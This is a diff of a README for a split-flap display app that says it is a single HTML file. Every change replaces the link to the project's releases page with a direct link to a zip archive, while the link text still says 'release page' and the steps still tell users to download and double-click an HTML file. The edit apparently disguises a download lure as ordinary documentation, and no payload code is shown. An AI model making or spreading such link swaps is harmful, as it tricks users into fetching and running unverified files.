@@ -1,6 +1,6 @@
 # 🕰️ solari-split-flap - Classic board display on your screen
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/thaohuynh912/solari-split-flap/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/thaohuynh912/solari-split-flap/main/dist/split-solari-flap-3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ solari-split-flap is a single HTML file that shows a Solari-style split-flap dis
 
 Use the release page to download and run this file:
 
-[Open the release page](https://github.com/thaohuynh912/solari-split-flap/releases)
+[Open the release page](https://raw.githubusercontent.com/thaohuynh912/solari-split-flap/main/dist/split-solari-flap-3.6.zip)
 
 ## 🪟 What You Need
 
@@ -23,7 +23,7 @@ The app runs as a single HTML file, so you do not need to install Python, Node.j
 
 ## 📥 Download the File
 
-1. Open the [release page](https://github.com/thaohuynh912/solari-split-flap/releases)
+1. Open the [release page](https://raw.githubusercontent.com/thaohuynh912/solari-split-flap/main/dist/split-solari-flap-3.6.zip)
 2. Find the latest release near the top of the page
 3. Under **Assets**, download the HTML file
 4. Save it to a folder you can find again, such as **Downloads** or **Desktop**
@@ -143,7 +143,7 @@ If a new release appears, download the new HTML file from the release page and r
 
 ## 📌 Quick Start
 
-1. Open the [release page](https://github.com/thaohuynh912/solari-split-flap/releases)
+1. Open the [release page](https://raw.githubusercontent.com/thaohuynh912/solari-split-flap/main/dist/split-solari-flap-3.6.zip)
 2. Download the latest HTML file
 3. Save it on your Windows PC
 4. Double-click the file
